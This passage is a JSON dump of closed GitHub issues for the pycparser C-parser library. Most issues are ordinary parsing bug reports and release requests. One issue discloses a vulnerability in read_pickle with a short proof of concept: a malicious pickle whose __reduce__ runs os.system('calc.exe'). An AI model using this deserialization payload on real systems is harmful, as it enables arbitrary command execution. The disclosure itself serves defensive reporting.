"https://api.github.com/users/david-richer-adsk/subscriptions", "organizations_url": "https://api.github.com/users/david-richer-adsk/orgs", "repos_url": "https://api.github.com/users/david-richer-adsk/repos", "events_url": "https://api.github.com/users/david-richer-adsk/events{/privacy}", "received_events_url": "https://api.github.com/users/david-richer-adsk/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-09-20T00:46:34Z", "updated_at": "2018-09-20T12:10:47Z", "closed_at": "2018-09-20T12:10:36Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi guys,\r\n\r\nWe now get the following error when installing package that pull the latest (2.19) version of pycparser on python 2.6. \r\n```\r\nFile \"/usr/lib/python2.6/site-packages/pycparser/__init__.py\", line 14, in <module>\r\n        from subprocess import check_output\r\n    ImportError: cannot import name check_output\r\n```\r\n\r\nWe know that python 2.6 is super old but it's still the version ship with CentOS 6. Feel free to drop support, a note about this in the change log would be appreciated. \r\n\r\nThanks for your time,\r\nDavid", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/280", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/280/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/280/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/280/events", "html_url": "https://github.com/eliben/pycparser/issues/280", "id": 361354225, "node_id": "MDU6SXNzdWUzNjEzNTQyMjU=", "number": 280, "title": "publish new release to pypi", "user": {"login": "jensgoe", "id": 6022600, "node_id": "MDQ6VXNlcjYwMjI2MDA=", "avatar_url": "https://avatars1.githubusercontent.com/u/6022600?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jensgoe", "html_url": "https://github.com/jensgoe", "followers_url": "https://api.github.com/users/jensgoe/followers", "following_url": "https://api.github.com/users/jensgoe/following{/other_user}", "gists_url": "https://api.github.com/users/jensgoe/gists{/gist_id}", "starred_url": "https://api.github.com/users/jensgoe/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jensgoe/subscriptions", "organizations_url": "https://api.github.com/users/jensgoe/orgs", "repos_url": "https://api.github.com/users/jensgoe/repos", "events_url": "https://api.github.com/users/jensgoe/events{/privacy}", "received_events_url": "https://api.github.com/users/jensgoe/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-09-18T15:12:05Z", "updated_at": "2018-09-20T12:46:14Z", "closed_at": "2018-09-20T12:46:14Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\ni was running in a problem. i checked the source on github and noticed it is already fixed (#197). \r\nThis fix is not published with a new release on pypi :-( \r\nAny plans to publish one?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/279", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/279/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/279/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/279/events", "html_url": "https://github.com/eliben/pycparser/issues/279", "id": 357131367, "node_id": "MDU6SXNzdWUzNTcxMzEzNjc=", "number": 279, "title": "Is there any way I can ignore new types? I have a huge c file, it's hard to typedef all of them out.", "user": {"login": "MengLiew", "id": 42942841, "node_id": "MDQ6VXNlcjQyOTQyODQx", "avatar_url": "https://avatars0.githubusercontent.com/u/42942841?v=4", "gravatar_id": "", "url": "https://api.github.com/users/MengLiew", "html_url": "https://github.com/MengLiew", "followers_url": "https://api.github.com/users/MengLiew/followers", "following_url": "https://api.github.com/users/MengLiew/following{/other_user}", "gists_url": "https://api.github.com/users/MengLiew/gists{/gist_id}", "starred_url": "https://api.github.com/users/MengLiew/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/MengLiew/subscriptions", "organizations_url": "https://api.github.com/users/MengLiew/orgs", "repos_url": "https://api.github.com/users/MengLiew/repos", "events_url": "https://api.github.com/users/MengLiew/events{/privacy}", "received_events_url": "https://api.github.com/users/MengLiew/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-09-05T09:00:02Z", "updated_at": "2018-09-05T12:17:31Z", "closed_at": "2018-09-05T12:17:31Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/278", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/278/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/278/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/278/events", "html_url": "https://github.com/eliben/pycparser/issues/278", "id": 356557837, "node_id": "MDU6SXNzdWUzNTY1NTc4Mzc=", "number": 278, "title": "Cannot apply to my own function type", "user": {"login": "MengLiew", "id": 42942841, "node_id": "MDQ6VXNlcjQyOTQyODQx", "avatar_url": "https://avatars0.githubusercontent.com/u/42942841?v=4", "gravatar_id": "", "url": "https://api.github.com/users/MengLiew", "html_url": "https://github.com/MengLiew", "followers_url": "https://api.github.com/users/MengLiew/followers", "following_url": "https://api.github.com/users/MengLiew/following{/other_user}", "gists_url": "https://api.github.com/users/MengLiew/gists{/gist_id}", "starred_url": "https://api.github.com/users/MengLiew/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/MengLiew/subscriptions", "organizations_url": "https://api.github.com/users/MengLiew/orgs", "repos_url": "https://api.github.com/users/MengLiew/repos", "events_url": "https://api.github.com/users/MengLiew/events{/privacy}", "received_events_url": "https://api.github.com/users/MengLiew/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-09-03T16:18:20Z", "updated_at": "2018-09-04T19:48:01Z", "closed_at": "2018-09-04T12:32:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "from __future__ import print_function\r\nimport sys\r\nfrom pycparser import parse_file\r\nfrom pycparser import c_parser\r\n\r\ntext = r\"\"\"\r\nU1 funcOne(int a, int b){\r\n    a = 1;\r\n    b = 2;\r\n    c = a + b;\r\n    return c;\r\n\r\n}\r\n\"\"\"\r\n\r\nparser = c_parser.CParser(text)\r\nast = parser.parse(text)\r\nprint(\"Structure 01:\")\r\nast.show()\r\n\r\n**Output: ParseError(':2:4: before: funcOne',)**\r\n\r\n\r\n### If I change function type from \"U1\" to \"void\", this script works fine. But why it cannot accept my own function type? Thank you.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/276", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/276/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/276/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/276/events", "html_url": "https://github.com/eliben/pycparser/issues/276", "id": 350541712, "node_id": "MDU6SXNzdWUzNTA1NDE3MTI=", "number": 276, "title": "pycparser + clang fail to parse pythread.h in python 3.7 - error: require native threads.", "user": {"login": "denfromufa", "id": 7870949, "node_id": "MDQ6VXNlcjc4NzA5NDk=", "avatar_url": "https://avatars1.githubusercontent.com/u/7870949?v=4", "gravatar_id": "", "url": "https://api.github.com/users/denfromufa", "html_url": "https://github.com/denfromufa", "followers_url": "https://api.github.com/users/denfromufa/followers", "following_url": "https://api.github.com/users/denfromufa/following{/other_user}", "gists_url": "https://api.github.com/users/denfromufa/gists{/gist_id}", "starred_url": "https://api.github.com/users/denfromufa/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/denfromufa/subscriptions", "organizations_url": "https://api.github.com/users/denfromufa/orgs", "repos_url": "https://api.github.com/users/denfromufa/repos", "events_url": "https://api.github.com/users/denfromufa/events{/privacy}", "received_events_url": "https://api.github.com/users/denfromufa/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2018-08-14T18:19:38Z", "updated_at": "2018-11-03T12:38:09Z", "closed_at": "2018-08-15T13:28:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "Changes made to python 3.7 now cause failure of parsing in pythread.h by clang:\r\n\r\nhttps://travis-ci.org/pythonnet/pythonnet/jobs/415741697#L1999\r\n\r\n```\r\n/opt/python/3.7.0/include/python3.7m/pythread.h:122:5: error: \"Require native\r\n      threads. See https://bugs.python.org/issue31370\"\r\n#   error \"Require native threads. See https://bugs.python.org/issue31370\"\r\n```\r\n\r\nDo I need to provide fake libc include for pythread.h or does this require some arguments to clang?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/274", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/274/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/274/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/274/events", "html_url": "https://github.com/eliben/pycparser/issues/274", "id": 343360029, "node_id": "MDU6SXNzdWUzNDMzNjAwMjk=", "number": 274, "title": "fails parsing structs/unions with 0 field", "user": {"login": "Sauci", "id": 6422442, "node_id": "MDQ6VXNlcjY0MjI0NDI=", "avatar_url": "https://avatars0.githubusercontent.com/u/6422442?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Sauci", "html_url": "https://github.com/Sauci", "followers_url": "https://api.github.com/users/Sauci/followers", "following_url": "https://api.github.com/users/Sauci/following{/other_user}", "gists_url": "https://api.github.com/users/Sauci/gists{/gist_id}", "starred_url": "https://api.github.com/users/Sauci/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Sauci/subscriptions", "organizations_url": "https://api.github.com/users/Sauci/orgs", "repos_url": "https://api.github.com/users/Sauci/repos", "events_url": "https://api.github.com/users/Sauci/events{/privacy}", "received_events_url": "https://api.github.com/users/Sauci/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2018-07-21T22:22:38Z", "updated_at": "2018-07-26T13:19:00Z", "closed_at": "2018-07-26T13:19:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "currently, the library fails parsing empty structure/union definitions such as \r\n```C\r\nstruct {\r\n} foo;\r\n\r\nunion\r\n{\r\n} bar;\r\n```\r\nI'm not sure if it is allowed by the **C99** standard, but at least **GCC** does not complains when compiling such a definition with the ```-std=c99``` flag.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/273", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/273/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/273/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/273/events", "html_url": "https://github.com/eliben/pycparser/issues/273", "id": 342591936, "node_id": "MDU6SXNzdWUzNDI1OTE5MzY=", "number": 273, "title": "read_pickle method is vulnerable ", "user": {"login": "Joel-MalwareBenchmark", "id": 33394474, "node_id": "MDQ6VXNlcjMzMzk0NDc0", "avatar_url": "https://avatars0.githubusercontent.com/u/33394474?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Joel-MalwareBenchmark", "html_url": "https://github.com/Joel-MalwareBenchmark", "followers_url": "https://api.github.com/users/Joel-MalwareBenchmark/followers", "following_url": "https://api.github.com/users/Joel-MalwareBenchmark/following{/other_user}", "gists_url": "https://api.github.com/users/Joel-MalwareBenchmark/gists{/gist_id}", "starred_url": "https://api.github.com/users/Joel-MalwareBenchmark/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Joel-MalwareBenchmark/subscriptions", "organizations_url": "https://api.github.com/users/Joel-MalwareBenchmark/orgs", "repos_url": "https://api.github.com/users/Joel-MalwareBenchmark/repos", "events_url": "https://api.github.com/users/Joel-MalwareBenchmark/events{/privacy}", "received_events_url": "https://api.github.com/users/Joel-MalwareBenchmark/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 12, "created_at": "2018-07-19T06:14:18Z", "updated_at": "2018-09-06T21:39:01Z", "closed_at": "2018-08-29T13:13:48Z", "author_association": "NONE", "active_lock_reason": null, "body": "```from pycparser.ply.yacc import LRTable\r\nimport pickle\r\nclass joel_test(object):\r\n    def __reduce__(self):\r\n        return eval, (\"os.system('calc.exe')\",)\r\ntest = joel_test()\r\nf=open('joel_test','wb')\r\npickle.dump(test,f)\r\nf.close()\r\njoel=LRTable()\r\njoel.read_pickle('joel_test')\r\n```\r\nHi, there is a vulnerability in read_pickle method in yacc.py, please see PoC above. It can execute arbitrary python commands resulting in command execution.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/272", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/272/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/272/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/272/events", "html_url": "https://github.com/eliben/pycparser/issues/272", "id": 338919133, "node_id": "MDU6SXNzdWUzMzg5MTkxMzM=", "number": 272, "title": "Incorrect Parsing of Floating Point Literals #2", "user": {"login": "washed", "id": 13495821, "node_id": "MDQ6VXNlcjEzNDk1ODIx", "avatar_url": "https://avatars3.githubusercontent.com/u/13495821?v=4", "gravatar_id": "", "url": "https://api.github.com/users/washed", "html_url": "https://github.com/washed", "followers_url": "https://api.github.com/users/washed/followers", "following_url": "https://api.github.com/users/washed/following{/other_user}", "gists_url": "https://api.github.com/users/washed/gists{/gist_id}", "starred_url": "https://api.github.com/users/washed/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/washed/subscriptions", "organizations_url": "https://api.github.com/users/washed/orgs", "repos_url": "https://api.github.com/users/washed/repos", "events_url": "https://api.github.com/users/washed/events{/privacy}", "received_events_url": "https://api.github.com/users/washed/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-07-06T12:23:04Z", "updated_at": "2018-07-06T12:27:34Z", "closed_at": "2018-07-06T12:27:34Z", "author_association": "NONE", "active_lock_reason": null, "body": "The following floating point literals are not parsed correctly:\r\n\r\n``float foo = 123.456;``\r\n``float foo = 123.456f;``\r\n``float foo = 123.456F;``\r\n``float foo = 1.234f;``\r\n``float foo = 1.234F;``\r\n\r\nSo there seems to be a problem with\r\n- float literals with more than 1 digit before the decimal separator\r\n- float literals with the explicit \"single\" suffix (f or F) appended to the literal\r\n\r\nThe values are parsed to \"None\"", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/270", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/270/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/270/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/270/events", "html_url": "https://github.com/eliben/pycparser/issues/270", "id": 335698819, "node_id": "MDU6SXNzdWUzMzU2OTg4MTk=", "number": 270, "title": "Is it possible to have .i files as input?", "user": {"login": "Jason2031", "id": 10261223, "node_id": "MDQ6VXNlcjEwMjYxMjIz", "avatar_url": "https://avatars0.githubusercontent.com/u/10261223?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Jason2031", "html_url": "https://github.com/Jason2031", "followers_url": "https://api.github.com/users/Jason2031/followers", "following_url": "https://api.github.com/users/Jason2031/following{/other_user}", "gists_url": "https://api.github.com/users/Jason2031/gists{/gist_id}", "starred_url": "https://api.github.com/users/Jason2031/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Jason2031/subscriptions", "organizations_url": "https://api.github.com/users/Jason2031/orgs", "repos_url": "https://api.github.com/users/Jason2031/repos", "events_url": "https://api.github.com/users/Jason2031/events{/privacy}", "received_events_url": "https://api.github.com/users/Jason2031/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-06-26T07:50:23Z", "updated_at": "2018-06-26T17:33:43Z", "closed_at": "2018-06-26T17:33:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "I have a ton of `.i` files which are generated using `gcc -E -I[path/to/include] xxx.c`. I noticed that pycparser can generate ast using `gcc` command showed in `using_gcc_E_libc.py`. Can it generate ast from `.i` files instead of `.c`?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/264", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/264/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/264/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/264/events", "html_url": "https://github.com/eliben/pycparser/issues/264", "id": 332720787, "node_id": "MDU6SXNzdWUzMzI3MjA3ODc=", "number": 264, "title": "Dependency on cpp", "user": {"login": "nicola-lunghi", "id": 25422924, "node_id": "MDQ6VXNlcjI1NDIyOTI0", "avatar_url": "https://avatars0.githubusercontent.com/u/25422924?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nicola-lunghi", "html_url": "https://github.com/nicola-lunghi", "followers_url": "https://api.github.com/users/nicola-lunghi/followers", "following_url": "https://api.github.com/users/nicola-lunghi/following{/other_user}", "gists_url": "https://api.github.com/users/nicola-lunghi/gists{/gist_id}", "starred_url": "https://api.github.com/users/nicola-lunghi/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nicola-lunghi/subscriptions", "organizations_url": "https://api.github.com/users/nicola-lunghi/orgs", "repos_url": "https://api.github.com/users/nicola-lunghi/repos", "events_url": "https://api.github.com/users/nicola-lunghi/events{/privacy}", "received_events_url": "https://api.github.com/users/nicola-lunghi/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2018-06-15T10:17:03Z", "updated_at": "2018-06-15T10:44:13Z", "closed_at": "2018-06-15T10:44:13Z", "author_association": "NONE", "active_lock_reason": null, "body": "Dear pycparser Developers, \r\n\r\nis true that pycparser need cpp installed on the machine to work?\r\n\r\nI am asking because yocto recipe of pycparser explicitely requires it\r\n\r\nhttps://github.com/openembedded/meta-openembedded/commit/a4a1950e36a86bcc3e60fffdb0bbe5bc98d9daf0\r\n```\r\nRDEPENDS_${PN}_class-target += \"\\\r\n    ${PYTHON_PN}-netclient \\\r\n    ${PYTHON_PN}-ply \\\r\n    ${PYTHON_PN}-pprint \\\r\n    cpp \\\r\n    cpp-symlinks \\\r\n    \"\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/263", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/263/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/263/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/263/events", "html_url": "https://github.com/eliben/pycparser/issues/263", "id": 332251237, "node_id": "MDU6SXNzdWUzMzIyNTEyMzc=", "number": 263, "title": "constant volatile pointers", "user": {"login": "nid16", "id": 39893843, "node_id": "MDQ6VXNlcjM5ODkzODQz", "avatar_url": "https://avatars0.githubusercontent.com/u/39893843?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nid16", "html_url": "https://github.com/nid16", "followers_url": "https://api.github.com/users/nid16/followers", "following_url": "https://api.github.com/users/nid16/following{/other_user}", "gists_url": "https://api.github.com/users/nid16/gists{/gist_id}", "starred_url": "https://api.github.com/users/nid16/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nid16/subscriptions", "organizations_url": "https://api.github.com/users/nid16/orgs", "repos_url": "https://api.github.com/users/nid16/repos", "events_url": "https://api.github.com/users/nid16/events{/privacy}", "received_events_url": "https://api.github.com/users/nid16/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2018-06-14T04:54:33Z", "updated_at": "2018-06-15T12:35:01Z", "closed_at": "2018-06-15T12:35:01Z", "author_association": "NONE", "active_lock_reason": null, "body": "Is there a way constant volatile pointer be parsed?\r\nSay in the lines of \"const volatile *const a=&x;\"", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/259", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/259/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/259/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/259/events", "html_url": "https://github.com/eliben/pycparser/issues/259", "id": 324668182, "node_id": "MDU6SXNzdWUzMjQ2NjgxODI=", "number": 259, "title": "Function prototypes with pointer to pointer params", "user": {"login": "maximumspatium", "id": 6561800, "node_id": "MDQ6VXNlcjY1NjE4MDA=", "avatar_url": "https://avatars3.githubusercontent.com/u/6561800?v=4", "gravatar_id": "", "url": "https://api.github.com/users/maximumspatium", "html_url": "https://github.com/maximumspatium", "followers_url": "https://api.github.com/users/maximumspatium/followers", "following_url": "https://api.github.com/users/maximumspatium/following{/other_user}", "gists_url": "https://api.github.com/users/maximumspatium/gists{/gist_id}", "starred_url": "https://api.github.com/users/maximumspatium/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/maximumspatium/subscriptions", "organizations_url": "https://api.github.com/users/maximumspatium/orgs", "repos_url": "https://api.github.com/users/maximumspatium/repos", "events_url": "https://api.github.com/users/maximumspatium/events{/privacy}", "received_events_url": "https://api.github.com/users/maximumspatium/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-05-19T23:25:51Z", "updated_at": "2018-05-21T13:47:31Z", "closed_at": "2018-05-21T13:47:31Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm trying to parse a real-world C source code (QEMU) with pycparser. It chokes on function prototypes containing pointer to pointer params like this:\r\n\r\n```\r\ntypedef struct Error {\r\n    int dummy;\r\n} Error;\r\nvoid func_with_pp_param(const char *, Error **);\r\n```\r\n\r\nAdding a name to the last param, i.e.\r\n\r\n`void func_with_pp_param(const char *, Error **p);`\r\n\r\nmakes the parsing magically work.\r\n\r\nAny chances to get a support for such constructs in pycparser?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/258", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/258/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/258/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/258/events", "html_url": "https://github.com/eliben/pycparser/issues/258", "id": 324621424, "node_id": "MDU6SXNzdWUzMjQ2MjE0MjQ=", "number": 258, "title": "Install examples/* binary with pycparser package", "user": {"login": "marmeladema", "id": 1629419, "node_id": "MDQ6VXNlcjE2Mjk0MTk=", "avatar_url": "https://avatars2.githubusercontent.com/u/1629419?v=4", "gravatar_id": "", "url": "https://api.github.com/users/marmeladema", "html_url": "https://github.com/marmeladema", "followers_url": "https://api.github.com/users/marmeladema/followers", "following_url": "https://api.github.com/users/marmeladema/following{/other_user}", "gists_url": "https://api.github.com/users/marmeladema/gists{/gist_id}", "starred_url": "https://api.github.com/users/marmeladema/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/marmeladema/subscriptions", "organizations_url": "https://api.github.com/users/marmeladema/orgs", "repos_url": "https://api.github.com/users/marmeladema/repos", "events_url": "https://api.github.com/users/marmeladema/events{/privacy}", "received_events_url": "https://api.github.com/users/marmeladema/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-05-19T11:01:52Z", "updated_at": "2018-05-21T13:16:22Z", "closed_at": "2018-05-21T13:16:22Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Hi,\r\n\r\nI have a use case where i need to use the c_json binary example to convert c to json using pycparser.\r\nBut at the moment, examples are not installed so i have to use pycparser from the git source tree which is not very conveniant for the future users of my package.\r\n\r\nI have forked this repository and made some changes for the examples to be installed and be more user friendly.\r\n\r\nWould you be ok if i open some merge request ?\r\n\r\nThank you for reading me !", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/257", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/257/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/257/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/257/events", "html_url": "https://github.com/eliben/pycparser/issues/257", "id": 321452749, "node_id": "MDU6SXNzdWUzMjE0NTI3NDk=", "number": 257, "title": "Cast to struct as pointer", "user": {"login": "knieselpriem", "id": 13505501, "node_id": "MDQ6VXNlcjEzNTA1NTAx", "avatar_url": "https://avatars1.githubusercontent.com/u/13505501?v=4", "gravatar_id": "", "url": "https://api.github.com/users/knieselpriem", "html_url": "https://github.com/knieselpriem", "followers_url": "https://api.github.com/users/knieselpriem/followers", "following_url": "https://api.github.com/users/knieselpriem/following{/other_user}", "gists_url": "https://api.github.com/users/knieselpriem/gists{/gist_id}", "starred_url": "https://api.github.com/users/knieselpriem/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/knieselpriem/subscriptions", "organizations_url": "https://api.github.com/users/knieselpriem/orgs", "repos_url": "https://api.github.com/users/knieselpriem/repos", "events_url": "https://api.github.com/users/knieselpriem/events{/privacy}", "received_events_url": "https://api.github.com/users/knieselpriem/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2018-05-09T06:58:54Z", "updated_at": "2019-03-14T20:15:48Z", "closed_at": "2019-03-14T20:15:47Z", "author_association": "NONE", "active_lock_reason": null, "body": "I tried to parse some C code with pycparser. Therefore I ran gcc with the option \"-E\" to preprocess the code. The result text shall be parsed with pycparser:\r\n```\r\nsource_code = self._preProcess()\r\nparser = c_parser.CParser()\r\nast = parser.parse(source_code, filename='<none>')\r\n```\r\nThe following preprocessed C code is parsed well:\r\n```\r\nstruct DB_MappingStruct\r\n{ unsigned short ID;\r\n  unsigned short ObsNr;\r\n  unsigned short Index;\r\n  unsigned char Typ;\r\n  unsigned char SubIndex;\r\n  unsigned short NovAdr;\r\n};\r\n\r\ntypedef struct DB_MappingStruct DB_ObjectTyp;\r\n...\r\nextern DB_ObjectTyp *DB_CallingSignal;\r\n...\r\nunsigned int REQUEST_Check(DB_ObjectTyp *p);\r\n```\r\n\r\n... but these code fragments are raising the exception `pycparser.plyparser.ParseError: <none>:3119:32: before: *`:\r\n```\r\nunsigned int ((DB_ObjectTyp *) &DB_Object[214]);\r\n...\r\nif ((((DB_ObjectTyp *) &DB_Object[214]) = DB_Uint(E1_BP_SollRate)) == 0)\r\n   {\r\n   ...\r\n```\r\nI think it's a problem with the cast to the struct `DB_ObjectTyp` as pointer, because the `*` is interpreted as operator `t_TIMES` in \"ctokens.py\".", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/256", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/256/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/256/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/256/events", "html_url": "https://github.com/eliben/pycparser/issues/256", "id": 318131219, "node_id": "MDU6SXNzdWUzMTgxMzEyMTk=", "number": 256, "title": "RuntimeError: Unable to invoke 'cpp'.  Make sure its path was passed correctly", "user": {"login": "eagleFromHeaven", "id": 32939855, "node_id": "MDQ6VXNlcjMyOTM5ODU1", "avatar_url": "https://avatars1.githubusercontent.com/u/32939855?v=4", "gravatar_id": "", "url": "https://api.github.com/users/eagleFromHeaven", "html_url": "https://github.com/eagleFromHeaven", "followers_url": "https://api.github.com/users/eagleFromHeaven/followers", "following_url": "https://api.github.com/users/eagleFromHeaven/following{/other_user}", "gists_url": "https://api.github.com/users/eagleFromHeaven/gists{/gist_id}", "starred_url": "https://api.github.com/users/eagleFromHeaven/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/eagleFromHeaven/subscriptions", "organizations_url": "https://api.github.com/users/eagleFromHeaven/orgs", "repos_url": "https://api.github.com/users/eagleFromHeaven/repos", "events_url": "https://api.github.com/users/eagleFromHeaven/events{/privacy}", "received_events_url": "https://api.github.com/users/eagleFromHeaven/received_events", "type": 